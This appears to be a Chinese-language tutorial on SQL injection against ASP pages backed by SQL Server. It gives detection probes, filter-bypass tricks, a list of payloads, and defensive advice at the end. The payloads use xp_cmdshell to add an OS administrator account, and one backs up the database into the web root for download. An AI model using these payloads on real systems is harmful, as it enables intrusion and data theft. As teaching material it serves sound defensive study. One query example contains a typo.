- [SQL Injection](#sql-injection)
    - [Overview](#overview)
    - [漏洞探测](#%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B)
        - [整型参数](#%E6%95%B4%E5%9E%8B%E5%8F%82%E6%95%B0)
        - [字符串参数](#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%82%E6%95%B0)
        - [特殊情况处理](#%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5%E5%A4%84%E7%90%86)
    - [常用 SQL Injection 语句](#%E5%B8%B8%E7%94%A8-sql-injection-%E8%AF%AD%E5%8F%A5)
    - [防范方法](#%E9%98%B2%E8%8C%83%E6%96%B9%E6%B3%95)

# SQL Injection 

## Overview

SQL Injection 以 Web database 为目标，一般利用 web 应用程序对特殊字符串过滤不完全的缺陷，通过精心构造的字符串达到非法访问 web database 内容或在 database 中执行命令的目的；

由于 SQL Injection 易学易用，致使 SQL Injection 成为 OWASP 公布的十大 web 安全漏洞之首；

## 漏洞探测

一般情况下，只要是带有参数的动态网页，那么就可能存在 SQL Injection 漏洞；

下边以 http://xxx.xxx/index.asp?id=YY 为例：
### 整型参数
当参数 YY 为整型时，网页通常所使用的 SQL 语句如下：
```sql
SELECT * FROM table_name WHERE col_name = YY
```
因此可使用以下语句进行探测，若三种情况全都满足，则足以推断 index.asp 中一定存在 SQL Injection 漏洞：
- 附加一个单引号“'”，即“http://xxx.xxx/index.asp?id=YY'”    
  测试结果为网页运行异常；

- 附加字符串“ and 1=1”，即“http://xxx.xxx/index.asp?id=YY and 1=1”    
  测试结果为网页运行正常，与原运行结果相同；

- 附加字符串“ and 1=2”，即“http://xxx.xxx/index.asp?id=YY and 1=2”    
  测试结果为网页运行异常；

### 字符串参数

当输出参 YY 数为字符串时，网页通常所使用的 SQL 语句如下：
```sql
SELECT * FROM table_name FROM col_name WHERE p = 'YY'
```
因此可使用以下语句进行探测，若三种情况全都满足，则足以推断 index.asp 中一定存在 SQL Injection 漏洞：
- 附加一个单引号“'”，即 “http://xxx.xxx/index.asp?p=YY'”    
  此时 SQL 语句变成：
  ```sql
  SELECT * FROM table_name WHERE col_name = 'YY''
  ```
  因此，运行结果异常；

- 附加字符串“' and '1'='1”，即 “http://xxx.xxx/index.asp?p=YY' and '1'='1”       
  此时 SQL 语句变成：
  ```sql
  SELECT * FROM table_name WHERE col_name = 'YY' and '1'='1'
  ```
  因此，运行结果应与原结果相同；

- 附加字符串“' and '1'='2”，即 “http://xxx.xxx/index.asp?p=YY' and '1'='2”       
  此时 SQL 语句变成：
  ```sql
  SELECT * FROM table_name WHERE col_name = 'YY' and '1'='2'
  ```
  因此，运行结果异常；

### 特殊情况处理

若 web 开发者在程序中做了一些 SQL Injection 的防范措施，如过滤掉单引号等敏感字符，可采取以下方法进行尝试：

- 大小写混合    
  由于 VBS 不区分大小写，而 web 开发者在过滤时通常要么全部过滤大写，要么全部过滤小写，而大小写混合的写法往往会被忽视，如：使用 `SelecT` 代替 `SELECT` 或 `select`；
- Unicode    
  可以将要输入的字符串转化为 Unicode 字符串再进行输入，如 “+” = “%2B”， 空格 = “%20” 等；
- ASCⅡ    
  可以将要输入的字符串转化为 Unicode 字符串再进行输入，如 “U” = chr(85)， a = chr(97) 等；

## 常用 SQL Injection 语句

在 SQL Injection 的探测和利用过程中，需要在 URL 中添加能够执行的 SQL 语句，以下为常用的 URL 附加 SQL Injection 语句（针对 SQL Server）：

- http://xxx.xxx/index.asp?p=YY and user_name()='dbo'     
  网页运行异常，可以得到当前连接数据库的用户名；     
  若将“user_name()='dbo'” 改为 “and (select user_name())>0”则可获取当前系统的连接用户；

- http://xxx.xxx/index.asp?p=YY and(select db_name())>0     
  网页运行异常，可以得到当前连接的数据库名；   
  若服务器端关闭了错误信息显示，则无法获取相关信息；

- http://xxx.xxx/index.asp?p=YY;exec master..xp_cmdshell' net user aaa bbb /add '--     
  添加一个操作系统用户 aaa，密码为 bbb；
  master 是 SQL Server 的主数据库；   
  “--”可以注释掉后边的字符串，保证特殊构造的 SQL 语句能够正确执行；

- http://xxx.xxx/index.asp?p=YY;exec master..xp_cmdshell' net localgroup administrators aaa /add '--     
  将刚刚添加的用户 aaa 加入到管理员用户组中；

- http://xxx.xxx/index.asp?p=YY;backup database 数据库名 to disk='c:\inetpub\wwwroot\save.db'     
  将数据库内容全部拷贝到指定目录下，即 wwwroot，以便进一步通过 HTTP 将 db 数据文件下载到本地；

- http://xxx.xxx/index.asp?p=YY and(select @@version)>0     
  用于获取 SQL Server 版本号；

## 防范方法

 - SQL Injection 探测的过程中，需要提交包含“;”、“--”、“select”、“union”、“update”、“add” 等字符串构造的SQL语句，因此防范 SQL Injection 最有效的方法是对用户的任何输入进行检测和过滤，确保用户输入数据的安全性；
 - 在构造动态 SQL 语句，要使用类安全的参数编码机制；
 - 禁止将敏感数据以明文形式存放在数据库中，以减小泄露重要机密的风险；
 - 遵循最小权限原则，只给访问数据库的web应用附以最低的权限，以提高安全性；



